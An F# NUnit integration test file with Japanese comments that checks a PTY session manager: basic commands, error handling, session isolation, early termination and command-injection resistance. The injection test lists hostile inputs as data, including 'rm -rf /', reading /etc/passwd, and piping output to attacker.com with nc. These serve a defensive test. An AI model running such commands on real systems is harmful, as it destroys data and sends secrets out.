namespace FCode.Tests

open NUnit.Framework
open System
open System.Threading.Tasks
open System.Threading
open FCode
open FCode.Logger

/// 実用的なコマンドでのPTY動作確認テスト
[<TestFixture>]
[<Category("Integration")>]
type PtyNetRealWorldTests() =

    let mutable ptyManager: PtyNetManager option = None

    [<SetUp>]
    member _.Setup() = ptyManager <- Some(new PtyNetManager())

    [<TearDown>]
    member _.TearDown() =
        match ptyManager with
        | Some manager ->
            (manager :> IDisposable).Dispose()
            ptyManager <- None
        | None -> ()

    /// 基本コマンドテスト - ls, echo, date
    [<Test>]
    member _.BasicCommands_Success() =
        async {
            match ptyManager with
            | Some manager ->
                // クロスプラットフォーム対応コマンド設定
                let basicCommands =
                    if
                        System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                            System.Runtime.InteropServices.OSPlatform.OSX
                        )
                    then
                        [ ("echo", [| "Hello, PTY Test!" |], "Hello, PTY Test!")
                          ("date", [| "+%Y" |], "2025") // macOS: 年のみフォーマット指定
                          ("pwd", [||], "/") ]
                    else
                        [ ("echo", [| "Hello, PTY Test!" |], "Hello, PTY Test!")
                          ("date", [| "+%Y-%m-%d" |], "2025") // Linux: フォーマット指定
                          ("pwd", [||], "/") ]

                for (cmd, args, expectedContent) in basicCommands do
                    logInfo "基本コマンドテスト" ("実行中: " + cmd + " " + String.Join(" ", args))

                    let! sessionResult = manager.CreateSession(cmd, args) |> Async.AwaitTask

                    match sessionResult with
                    | Result.Ok _session ->
                        // 出力待機
                        do! Task.Delay(1000) |> Async.AwaitTask
                        let output = manager.GetOutput()

                        Assert.IsNotEmpty(output, cmd + "コマンドの出力が空です")

                        Assert.That(
                            output.Contains(expectedContent),
                            Is.True,
                            cmd + "コマンドの期待する内容が含まれていません: " + expectedContent
                        )

                        manager.CloseSession()
                        manager.ClearOutput()

                    | Result.Error error -> Assert.Fail(cmd + "コマンドセッション作成に失敗: " + error)

            | None -> Assert.Fail("PTYマネージャーが初期化されていません")
        }
        |> Async.RunSynchronously

    /// 存在しないコマンドのエラーハンドリングテスト
    [<Test>]
    member _.NonExistentCommand_ErrorHandling() =
        async {
            match ptyManager with
            | Some manager ->
                logInfo "エラーハンドリングテスト" "存在しないコマンド実行"

                let! sessionResult = manager.CreateSession("nonexistent-command-12345", [||]) |> Async.AwaitTask

                match sessionResult with
                | Result.Ok _session ->
                    // エラー出力を待機
                    do! Task.Delay(2000) |> Async.AwaitTask
                    let output = manager.GetOutput()

                    // 何らかのエラー出力があることを確認
                    Assert.IsNotEmpty(output, "存在しないコマンドでも何らかの出力があるべきです")

                    manager.CloseSession()

                | Result.Error _error ->
                    // エラーで失敗するのも正常な動作
                    logInfo "エラーハンドリング" "期待通りエラーで失敗しました"
                    Assert.Pass("存在しないコマンドで適切にエラーが発生しました")

            | None -> Assert.Fail("PTYマネージャーが初期化されていません")
        }
        |> Async.RunSynchronously

    /// 複数セッション同時実行テスト
    [<Test>]
    member _.MultipleSessionsConcurrent_Isolation() =
        async {
            match ptyManager with
            | Some manager1 ->
                use manager2 = new PtyNetManager()
                use manager3 = new PtyNetManager()

                logInfo "複数セッションテスト" "3つの独立セッション同時実行"

                // 3つの異なるコマンドを同時実行
                let! session1Result = manager1.CreateSession("echo", [| "Session-1" |]) |> Async.AwaitTask
                let! session2Result = manager2.CreateSession("echo", [| "Session-2" |]) |> Async.AwaitTask
                let! session3Result = manager3.CreateSession("echo", [| "Session-3" |]) |> Async.AwaitTask

                // すべてのセッションが成功することを確認
                Assert.That(
                    session1Result,
                    Is.TypeOf<Result<PtySession, string>>().And.Property("IsOk").True,
                    "セッション1作成失敗"
                )

                Assert.That(
                    session2Result,
                    Is.TypeOf<Result<PtySession, string>>().And.Property("IsOk").True,
                    "セッション2作成失敗"
                )

                Assert.That(
                    session3Result,
                    Is.TypeOf<Result<PtySession, string>>().And.Property("IsOk").True,
                    "セッション3作成失敗"
                )

                // 出力待機
                do! Task.Delay(1500) |> Async.AwaitTask

                // 各セッションの出力が独立していることを確認
                let output1 = manager1.GetOutput()
                let output2 = manager2.GetOutput()
                let output3 = manager3.GetOutput()

                Assert.IsTrue(output1.Contains("Session-1"), "セッション1の出力が正しくありません")
                Assert.IsTrue(output2.Contains("Session-2"), "セッション2の出力が正しくありません")
                Assert.IsTrue(output3.Contains("Session-3"), "セッション3の出力が正しくありません")

                // クロス汚染がないことを確認
                Assert.That(
                    output1.Contains("Session-2") || output1.Contains("Session-3"),
                    Is.False,
                    "セッション1に他の出力が混入しています"
                )

                Assert.That(
                    output2.Contains("Session-1") || output2.Contains("Session-3"),
                    Is.False,
                    "セッション2に他の出力が混入しています"
                )

                Assert.That(
                    output3.Contains("Session-1") || output3.Contains("Session-2"),
                    Is.False,
                    "セッション3に他の出力が混入しています"
                )

                logInfo
                    "複数セッションテスト結果"
                    ("session1="
                     + output1.Length.ToString()
                     + ", session2="
                     + output2.Length.ToString()
                     + ", session3="
                     + output3.Length.ToString())

            | None -> Assert.Fail("PTYマネージャーが初期化されていません")
        }
        |> Async.RunSynchronously

    /// 長時間実行コマンドと中断テスト
    [<Test>]
    member _.LongRunningCommand_EarlyTermination() =
        async {
            match ptyManager with
            | Some manager ->
                logInfo "長時間実行テスト" "pingコマンド実行と早期終了"

                // 長時間実行コマンドをクロスプラットフォーム対応に変更
                let! sessionResult =
                    if
                        System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                            System.Runtime.InteropServices.OSPlatform.OSX
                        )
                    then
                        manager.CreateSession("sleep", [| "3" |]) |> Async.AwaitTask // macOS: sleepコマンド
                    else
                        manager.CreateSession("ping", [| "-c"; "10"; "127.0.0.1" |]) |> Async.AwaitTask // Linux: ping

                match sessionResult with
                | Result.Ok _session ->
                    // 2秒後に出力を確認
                    do! Task.Delay(2000) |> Async.AwaitTask
                    let partialOutput = manager.GetOutput()

                    // macOSのsleepコマンドは出力がないので条件分岐
                    if
                        System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(
                            System.Runtime.InteropServices.OSPlatform.OSX
                        )
                    then
                        // sleepコマンドは出力なしが正常
                        Assert.Pass("macOS sleepコマンドは正常に実行されました")
                    else
                        Assert.IsNotEmpty(partialOutput, "長時間実行コマンドの部分出力が空です")

                    // セッションを早期終了
                    manager.CloseSession()

                    // 終了後に出力が増加しないことを確認
                    let finalOutput = manager.GetOutput()
                    do! Task.Delay(1000) |> Async.AwaitTask
                    let afterDelayOutput = manager.GetOutput()

                    Assert.That(
                        afterDelayOutput.Length,
                        Is.EqualTo(finalOutput.Length),
                        "セッション終了後に出力が増加しています（適切に終了していない可能性）"
                    )

                | Result.Error error -> Assert.Fail("長時間実行コマンドセッション作成に失敗: " + error)

            | None -> Assert.Fail("PTYマネージャーが初期化されていません")
        }
        |> Async.RunSynchronously

    /// セキュリティテスト - コマンドインジェクション耐性
    [<Test>]
    member _.SecurityTest_CommandInjectionResistance() =
        async {
            match ptyManager with
            | Some manager ->
                logInfo "セキュリティテスト" "コマンドインジェクション耐性確認"

                // 悪意のある入力パターンをテスト
                let maliciousInputs =
                    [ "echo 'test'; rm -rf /"
                      "echo test && cat /etc/passwd"
                      "echo test | nc attacker.com 1234"
                      "$(malicious-command)"
                      "`malicious-command`" ]

                for maliciousInput in maliciousInputs do
                    let! sessionResult = manager.CreateSession("echo", [| maliciousInput |]) |> Async.AwaitTask

                    match sessionResult with
                    | Result.Ok _session ->
                        do! Task.Delay(1000) |> Async.AwaitTask
                        let output = manager.GetOutput()

                        // 入力がそのまま出力されることを確認（実行されていない）
                        Assert.That(
                            output.Contains(maliciousInput),
                            Is.True,
                            "悪意のある入力が適切にエスケープされていません: " + maliciousInput
                        )

                        // 実際のコマンド実行の痕跡がないことを確認
                        // 注意: .NET ProcessはシェルインジェクションをデフォルトでBlockしないため、
                        // この場合はechoコマンドの引数として渡されることを確認
                        logInfo
                            "セキュリティテスト結果"
                            ("入力: " + maliciousInput + " 出力: " + output.Substring(0, min 100 output.Length))

                        // 出力に含まれている場合は、実行ではなくecho出力であることを確認
                        if output.Contains("/etc/passwd") then
                            // これはechoコマンドの引数として処理されたもので、実際のファイル内容でない場合は安全
                            Assert.That(
                                output.Contains("root:x:"),
                                Is.False,
                                "実際のpasswdファイルが読み込まれた可能性: " + maliciousInput
                            )

                        // 権限エラーなどの実行痕跡をチェック
                        Assert.IsFalse(output.Contains("Permission denied"), "権限昇格の試行が検出されました")

                        manager.CloseSession()
                        manager.ClearOutput()

                    | Result.Error _error ->
                        // エラーで失敗するのも安全な動作
                        logInfo "セキュリティテスト" ("悪意のある入力で適切にエラー: " + maliciousInput)

            | None -> Assert.Fail("PTYマネージャーが初期化されていません")
        }
        |> Async.RunSynchronously
